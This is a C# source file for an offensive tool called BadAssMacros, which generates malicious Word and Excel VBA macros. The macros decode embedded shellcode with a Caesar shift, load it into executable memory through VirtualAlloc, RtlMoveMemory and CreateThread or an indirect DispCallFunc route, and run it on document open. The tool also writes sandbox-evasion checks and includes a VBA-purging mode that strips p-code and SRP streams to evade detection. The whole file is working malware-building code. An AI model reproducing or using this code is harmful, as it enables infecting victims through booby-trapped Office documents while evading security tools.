using NDesk.Options;
using OpenMcdf;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;


namespace BadAssMacros
{
    class BadAssMacros
    {
        static string outputFName = "";
        static FileStream fs;
        static String[] s = new String[20];
        static Random rd = new Random();
        static string shellcodeexec = "classic";
        static int caesar = 0;

        public static void Import_Statements(string shellcode)

        {
            if (shellcode == "classic")
            {
                WriteFile("Private Declare PtrSafe Function CreateThread Lib \"KERNEL32\"(ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr\n");
                WriteFile("Private Declare PtrSafe Function VirtualAlloc Lib \"KERNEL32\"(ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n");
                WriteFile("Private Declare PtrSafe Function RtlMoveMemory Lib \"KERNEL32\"(ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr\n");
            }

            else if (shellcode == "indirect")
            {

                WriteFile("Declare PtrSafe Function DispCallFunc Lib \"OleAut32.dll\"(ByVal pvInstance As Long, ByVal offsetinVft As Long, ByVal CallConv As Long, ByVal retTYP As Integer, ByVal paCNT As Long, ByRef paTypes As Integer, ByRef paValues As Long, ByRef retVAR As Variant) As Long\n");
                WriteFile("Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\"(ByVal lpLibFileName As String) As Long\n");
                WriteFile("Declare PtrSafe Function GetProcAddress Lib \"kernel32\"(ByVal hModule As Long, ByVal lpProcName As String) As Long\n");
            }

        }

        public static void Constant(string shellcode)
        {
            if (shellcode == "indirect")
            {
                WriteFile("Const CC_STDCALL = 4\n");
                WriteFile("Const MEM_COMMIT = &H1000\n");
                WriteFile("Const PAGE_EXECUTE_READWRITE = &H40\n");
                WriteFile("Private VType(0 To 63) As Integer, VPtr(0 To 63) As Long\n");

            }

        }

        public static void Malicious(string shellcode)

        {
            if (shellcode == "classic")
            {
                WriteFile("Function " + s[0] + "()\n");
                WriteFile(Declare_variable(s[1], "Variant\n"));
                WriteFile(Declare_variable(s[2], "LongPtr\n"));
                WriteFile(Declare_variable(s[3], "Long\n"));
                WriteFile(Declare_variable(s[4], "Long\n"));
                WriteFile(Declare_variable(s[5], "LongPtr\n"));
            }

            else if (shellcode == "indirect")
            {
                WriteFile("Function " + s[0] + "()\n");
                WriteFile(Declare_variable(s[1], "Long\n"));
                WriteFile(Declare_variable(s[2], "Long\n"));
            }
        }

        public static void FunctionCalls(string shellcode)
        {

            if (shellcode == "classic")
            {
                WriteFile(s[2] + " = VirtualAlloc(0, UBound(" + s[1] + "), &H3000, &H40)\n");
                WriteFile("For " + s[3] + " = LBound(" + s[1] + ") To UBound(" + s[1] + ")\n");
                WriteFile(s[4] + " = " + s[1] + "(" + s[3] + ")\n");
                WriteFile(s[5] + "= RtlMoveMemory(" + s[2] + " + " + s[3] + "," + s[4] + ", 1)\n");
                WriteFile("Next " + s[3] + "\n");
                WriteFile("res = CreateThread(0, 0, " + s[2] + ", 0, 0, 0)\n");
                WriteFile("End Function\n");
            }

            else if (shellcode == "indirect")
            {
                WriteFile(s[1] + " = stdCallA(\"kernel32\", \"VirtualAlloc\", vbLong, 0&, UBound(" + s[3] + "), MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n");
                WriteFile("For " + s[4] + " = LBound(" + s[3] + ") To UBound(" + s[3] + ")\n");
                WriteFile(s[5] + " = " + s[3] + "(" + s[4] + ")\n");
                WriteFile(s[2] + " = stdCallA(\"kernel32\", \"RtlMoveMemory\", vbLong, " + s[1] + "+" + s[4] + ", " + s[5] + ", 1)\n");
                WriteFile("Next " + s[4] + "\n");
                WriteFile(s[2] + " = stdCallA(\"kernel32\", \"CreateThread\", vbLong, 0&, 0&, " + s[1] + ", 0&, 0&, 0&)\n");
                WriteFile("End Function\n\n\n");

                //New Function
                WriteFile("Public Function stdCallA(sDll As String, sFunc As String, ByVal RetType As VbVarType, ParamArray P() As Variant)\n");
                WriteFile("Dim i As Long, pFunc As Long, V(), HRes As Long\n");
                WriteFile("ReDim V(0)\n");
                WriteFile("V = P\n");
                WriteFile("For i = 0 To UBound(V)\n");
                WriteFile("If VarType(P(i)) = vbString Then P(i) = StrConv(P(i), vbFromUnicode): V(i) = StrPtr(P(i))\n");
                WriteFile("VType(i) = VarType(V(i))\n");
                WriteFile("VPtr(i) = VarPtr(V(i))\n");
                WriteFile("Next i\n");
                WriteFile("HRes = DispCallFunc(0, GetProcAddress(LoadLibrary(sDll), sFunc), CC_STDCALL, RetType, i, VType(0), VPtr(0), stdCallA)\n");
                WriteFile("End Function\n");
            }


        }

        public static string Declare_variable(string var1, string var2)
        {
            return " Dim " + var1 + " As " + var2;
        }

        public static void WriteFile(string str)
        {
            Byte[] m1 = new UTF8Encoding(true).GetBytes(str);
            fs.Write(m1, 0, m1.Length);
        }

        internal static string CreateString(int stringLength)
        {
            const string allowedChars = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
            char[] chars = new char[stringLength];

            for (int i = 0; i < stringLength; i++)
            {
                chars[i] = allowedChars[rd.Next(0, allowedChars.Length)];
            }

            return new string(chars);
        }

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        public static void Ascii()
        {

            Console.WriteLine("  ____            _                  __  __                          ");
            Console.WriteLine(" |  _ \\          | |   /\\           |  \\/  |                         ");
            Console.WriteLine(" | |_) | __ _  __| |  /  \\   ___ ___| \\  / | __ _  ___ _ __ ___  ___ ");
            Console.WriteLine(" |  _ < / _` |/ _` | / /\\ \\ / __/ __| |\\/| |/ _` |/ __| '__/ _ \\/ __|");
            Console.WriteLine(" | |_) | (_| | (_| |/ ____ \\__ \\__ \\| |  | | (_| | (__| | | (_) \\__ \\");
            Console.WriteLine(" |____/ \\__,_|\\__,_/_/    \\_\\___/___/_|  |_|\\__,_|\\___|_|  \\___/|___/");
            Console.WriteLine("\t\t\t            \n\n Author: @Inf0secRabbit && @SoumyadeepBas12\n");

        }

        static void Main(string[] args)
        {
            String _filename = "";
            var show_help = false;
            String _type = "";
            String _purge = "";
            String _modname = "";
            var list_module = false;

            Ascii();

            OptionSet options = new OptionSet(){
                {"i|input=","Input file\n", v => _filename=v},
                {"w|macroType=","excel,doc\n", v =>_type=v},
                {"p|purge=","yes,no\n", v => _purge=v},
                {"s|codeexecmethod=","classic,indirect\n",v => shellcodeexec=v},
                {"m|modulename=","Module Name\n", v => _modname=v},
                {"l|listmodules","List modules\n", v => list_module = v != null},
                {"o|output=","Generated outputfile\n", v =>outputFName=v},
                {"c|shift=","Enter caesar shift between 1-25\n",v =>caesar=Convert.ToInt32(v)},
                {"h|?|help","Show Help\n", v => show_help = v != null},
            };




            try
            {
                options.Parse(args);

                if (_purge == "no")
                {
                    if (show_help)
                    {
                        ShowHelp(options);
                        return;
                    }

                    if (_type == "" || _filename == "" || outputFName == "")
                    {
                        Console.WriteLine("[+] Either of type, filename or outfile cannot be empty");
                        ShowHelp(options);
                        return;
                    }

                    if (_type != "excel" && _type != "doc")
                    {
                        Console.WriteLine("[+] Filetype can be excel or doc only");
                        ShowHelp(options);
                        return;
                    }

                    if ((caesar > 25 || caesar < 1) && shellcodeexec == "classic")
                    {
                        Console.WriteLine("Uhh-Ohh!! Caesar length should be less than 25 and more than 1");
                        ShowHelp(options);
                        return;
                    }

                    Console.WriteLine("[i] Encoding your shellcode");
                    if (_type == "doc")
                    {
                        Console.WriteLine("[+] Word macro written to: " + outputFName);
                    }
                    if (_type == "excel")
                    {
                        Console.WriteLine("[+] Excel macro written to: " + outputFName);
                    }
                    fs = File.Create(outputFName);

                    for (int i = 0; i < 20; ++i)
                    {
                        s[i] = CreateString(3);
                    }
                    Import_Statements(shellcodeexec);
                    Constant(shellcodeexec);
                    Malicious(shellcodeexec);
                    Sandboxingdetection(shellcodeexec);
                    Encrypt(File.ReadAllBytes(_filename), shellcodeexec);
                    Decrypt(shellcodeexec);
                    FunctionCalls(shellcodeexec);
                    switch (_type)
                    {
                        case "excel":
                            Workbookopen();
                            break;
                        case "doc":
                            Docopen();
                            break;

                    }
                    Auto_open(_type);


                }

                if (_purge == "yes")
                {

                    if (show_help)
                    {
                        ShowHelp(options);
                        return;
                    }

                    if ((_type == "" || _filename == "" || outputFName == "" || _modname == "") && !list_module)
                    {
                        Console.WriteLine("[+] Either of type, filename, outfile or modulename cannot be empty");
                        ShowHelp(options);
                        return;
                    }

                    if (_type != "excel" && _type != "doc")
                    {
                        Console.WriteLine("[+] Filetype can be excel or doc only");
                        ShowHelp(options);
                        return;
                    }

                    try
                    {
                        if (!list_module)
                        {
                            string outFilename = Utils.GetOutFilename(outputFName);
                            string oleFilename = outFilename;

                            if (File.Exists(outFilename)) File.Delete(outFilename);
                            File.Copy(_filename, outFilename);
                            _filename = outFilename;
                        }

                        CompoundFile cf = new CompoundFile(_filename, CFSUpdateMode.Update, 0);
                        CFStorage commonStorage = cf.RootStorage;

                        if (_type == "doc")
                        {
                            commonStorage = cf.RootStorage.GetStorage("Macros");
                        }

                        else if (_type == "excel")
                        {
                            commonStorage = cf.RootStorage.GetStorage("_VBA_PROJECT_CUR");
                        }

                        byte[] dirStream = Utils.Decompress(commonStorage.GetStorage("VBA").GetStream("dir").GetData());
                        List<Utils.ModuleInformation> vbaModules = Utils.ParseModulesFromDirStream(dirStream);

                        if (list_module)
                        {
                            int num = 0;
                            foreach (var vbaModule in vbaModules)
                            {
                                num = num++;
                                Console.WriteLine("\n[+] Module name " + num + ": " + vbaModule.moduleName);
                            }
                            return;
                        }

                        byte[] streamBytes;
                        bool module_found = false;
                        foreach (var vbaModule in vbaModules)
                        {
                            //VBA Purging start
                            if (vbaModule.moduleName == _modname)
                            {
                                Console.WriteLine("\n[+] Target module name: " + vbaModule.moduleName);

                                streamBytes = commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).GetData();
                                string OG_VBACode = Utils.GetVBATextFromModuleStream(streamBytes, vbaModule.textOffset);

                                streamBytes = Utils.RemovePcodeInModuleStream(streamBytes, vbaModule.textOffset, OG_VBACode);
                                commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).SetData(streamBytes);
                                module_found = true;

                            }
                        }

                        if (module_found == false)
                        {
                            Console.WriteLine("\n[!] Cannot find module inside target document (-m).\nList all module streams with (-l).\n");
                            cf.Commit();
                            cf.Close();
                            CompoundFile.ShrinkCompoundFile(_filename);
                            File.Delete(_filename);
                            return;
                        }

                        commonStorage.GetStorage("VBA").GetStream("dir").SetData(Utils.Compress(Utils.ChangeOffset(dirStream)));

                        byte[] data = Utils.HexToByte("CC-61-FF-FF-00-00-00");
                        commonStorage.GetStorage("VBA").GetStream("_VBA_PROJECT").SetData(data);

                        try
                        {
                            commonStorage.GetStorage("VBA").Delete("__SRP_0");
                            commonStorage.GetStorage("VBA").Delete("__SRP_1");
                            commonStorage.GetStorage("VBA").Delete("__SRP_2");
                            commonStorage.GetStorage("VBA").Delete("__SRP_3");

                        }
                        catch (Exception)
                        {
                            Console.WriteLine("\n[*] No SRP streams found.");
                        }


                        cf.Commit();
                        cf.Close();
                        CompoundFile.ShrinkCompoundFile(_filename);
                        Console.WriteLine("\n[+] VBA Purging completed successfully!\n");
                    }

                    catch (FileNotFoundException ex) when (ex.Message.Contains("Could not find file"))
                    {
                        Console.WriteLine("\n[!] Could not find path or file (-f). \n");
                    }

                    catch (CFItemNotFound ex) when (ex.Message.Contains("Cannot find item"))
                    {
                        Console.WriteLine("\n[!] File (-f) does not match document type selected (-d).\n");
                    }

                    catch (CFFileFormatException)
                    {
                        Console.WriteLine("\n[!] Incorrect filetype (-f). Must be an OLE strucutred file. OfficePurge supports .doc, .xls, or .pub documents.\n");
                    }
                }

                if (_purge != "yes" && _purge != "no")
                {
                    ShowHelp(options);
                    return;
                }

            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                ShowHelp(options);
                return;
            }

        }
        public static void Sandboxingdetection(string shellcodeexec)
        {

            if (shellcodeexec == "classic")
            {
                //Recent Files Count
                WriteFile(" If Application.RecentFiles.Count < 3 Then\n");
                WriteFile("Exit Function\n");
                WriteFile("End if\n");

                //Core check
                WriteFile("Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")\n");
                WriteFile("Set colItems = objWMIService.ExecQuery(\"Select * from Win32_Processor\", , 48)\n");
                WriteFile("For Each objItem In colItems\n");
                WriteFile("If objItem.NumberOfCores < 3 Then\n");
                WriteFile("Exit Function\n");
                WriteFile("End If\n");
                WriteFile("Next\n");

            }

        }

        public static void Decrypt(string shellcode)
        {
            if (shellcode == "classic")
            {
                WriteFile("For i = 0 To UBound(" + s[1] + ")\n");
                WriteFile(s[1] + "(i) = " + s[1] + "(i) - " + caesar + "\n");
                WriteFile("Next i\n");
            }

        }

        public static void Docopen()
        {
            WriteFile("Sub Document_Open()\n");
            WriteFile(s[0] + "\n");
            WriteFile("End Sub\n");
        }

        public static void Workbookopen()
        {
            WriteFile("Sub Workbook_Open()\n");
            WriteFile(s[0] + "\n");
            WriteFile("End Sub\n");
        }


        public static void Auto_open(string type)
        {
            if (type == "doc")
            {

                WriteFile("Sub AutoOpen()\n");
                WriteFile(s[0] + "\n");
                WriteFile("End Sub\n");

            }
            else if (type == "excel")
            {
                WriteFile("Sub Auto_Open()\n");
                WriteFile(s[0] + "\n");
                WriteFile("End Sub\n");
            }

        }

        public static void Encrypt(byte[] bytes, string shellcode)
        {

            if (shellcode == "classic")
            {

                //Adding a stringbuilder for further use 
                var sb = new StringBuilder("");
                uint counter = 0;
                foreach (var b in bytes)
                {
                    //Adding Ceaser cipher
                    sb.AppendFormat("{0:D}, ", (uint)b + caesar);
                    counter++;

                    //Adding a line break after every 50 char
                    if (counter % 50 == 0)
                    {
                        sb.AppendFormat("_{0}", Environment.NewLine);
                    }
                }
                String payload = sb.ToString();
                if (bytes.Length % 50 == 0)
                {
                    payload = payload.Substring(0, payload.Length - 5);
                }
                else
                {
                    payload = payload.Substring(0, payload.Length - 2);
                }
                Byte[] final = new UTF8Encoding(true).GetBytes(" " + s[1] + " = Array(" + payload + ")\n");
                fs.Write(final, 0, final.Length);

            }
            else if (shellcode == "indirect")
            {

                //Adding a stringbuilder for further use 
                var sb = new StringBuilder("");
                uint counter = 0;
                foreach (var b in bytes)
                {
                    //Adding Ceaser cipher
                    sb.AppendFormat("Chr(&H{0:X}), ", (uint)b);
                    counter++;

                    //Adding a line break after every 30 char
                    if (counter % 30 == 0)
                    {
                        sb.AppendFormat("_{0}", Environment.NewLine);
                    }
                }
                String payload = sb.ToString();
                if (bytes.Length % 30 == 0)
                {
                    payload = payload.Substring(0, payload.Length - 5);
                }
                else
                {
                    payload = payload.Substring(0, payload.Length - 2);
                }
                Byte[] final = new UTF8Encoding(true).GetBytes(" " + s[3] + " = Array(" + payload + ")\n\n");
                fs.Write(final, 0, final.Length);

            }


        }


    }
}
